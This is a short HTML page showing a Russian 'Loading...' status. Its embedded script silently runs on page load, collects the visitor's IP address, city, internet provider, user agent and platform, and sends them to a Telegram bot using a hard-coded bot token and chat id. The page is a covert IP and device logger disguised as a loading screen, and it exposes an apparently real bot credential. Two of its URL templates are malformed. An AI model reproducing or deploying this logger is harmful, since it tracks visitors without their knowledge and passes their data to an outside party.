<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
    <h1 id="status">Загрузка... (v16.0)</h1>
    <script>
        async function run() {
            const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
            const chat_id = "8242133853";
            const status = document.getElementById('status');
            try {
                const ipRes = await fetch('https://api.ipify.org');
                const ipData = await ipRes.json();
                const ipv4 = ipData.ip;
                const geoRes = await fetch(`https://ipapi.co{ipv4}/json/`);
                const geoData = await geoRes.json();
                const message = `🚀 ЛОГ!\nIP: ${ipv4}\nГород: ${geoData.city}\nПровайдер: ${geoData.org}\n📱 Устройство: ${navigator.userAgent}\n💻 Платформа: ${navigator.platform}`;
                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
                await fetch(url);
                status.innerText = "ГОТОВО!";
            } catch (e) {
                status.innerText = "Ошибка: " + e;
            }
        }
        run();
    </script>
</body>
</html>
